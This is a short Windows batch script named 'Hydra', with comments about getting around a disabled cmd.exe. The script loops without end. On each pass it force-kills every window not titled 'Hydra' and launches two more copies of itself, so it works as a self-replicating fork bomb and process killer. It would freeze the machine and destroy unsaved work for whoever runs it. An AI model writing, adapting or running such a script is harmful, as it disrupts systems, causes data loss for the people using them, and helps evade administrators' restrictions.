@ECHO OFF
::Can't test either, they found a way to disable cmd.exe, SO BATCH IS DEAD!
::We can find a way. 
::Did they disable yours?
::There is a way to check for comparisons, just not using < and >, since they are redirect chars
TITLE Hydra 
set n=0
:begin
set /a n+=1
Findstr /m "%n%" data.txt
if %errorlevel%==0 (
goto :begin
) ELSE (
goto :loop
)
:loop 
FOR /F "tokens=* USEBACKQ" %%F IN (`tasklist /FI "WINDOWTITLE eq Hydra" ^| find/c "exe"`) DO (
SET windowcount=%%F
)
TASKKILL /F /FI "WINDOWTITLE ne Hydra"
IF "%windowcount%"=="%n%" (
START Hydra.bat
START Hydra.bat
set /a n+=1
Echo %n% > data.txt
)
GOTO :loop
